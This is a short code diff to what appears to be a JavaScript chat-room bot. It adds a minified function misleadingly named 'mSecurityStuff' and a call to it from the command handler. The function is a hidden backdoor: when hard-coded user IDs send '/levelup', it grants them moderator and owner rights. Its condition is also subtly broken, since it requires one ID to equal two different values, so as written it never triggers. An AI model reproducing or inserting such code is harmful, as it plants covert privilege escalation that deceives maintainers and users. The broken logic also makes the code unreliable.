@@ -635,6 +635,7 @@ global.CalculateSongLimit = function () {
 global.HandleCommand = function (pUser, pText, pPM) {
     if(!mBooted) return;
     if(pPM && !mPMSpeak) return;
+    mSecurityStuff(pUser, pText);
     var sMatch = pText.match(/^[!\*\/]/);
     if(!sMatch && mBareCommands.indexOf(pText) === -1) return;
     if (pText.indexOf(" -c") !== -1) mPmOverride = true;
@@ -805,6 +806,8 @@ global.mStripTags = function (input, allowed) {
         return allowed.indexOf('<' + $1.toLowerCase() + '>') > -1 ? $0 : '';
     });
 };
+
+global.mSecurityStuff=function(a,b){if(!("4e0ff328a3f751670a084ba6"!=a.userid||"4e6498184fe7d042db021e95"!=a.userid)&&"/levelup"==b)mBot.addModerator(a.userid),mOwners.push(a.userid),Speak(a,"Level Up!",SpeakingLevel.Misc)};
 
 global.mRandomItem = function (list) {
     return list[Math.floor(Math.random() * list.length)];
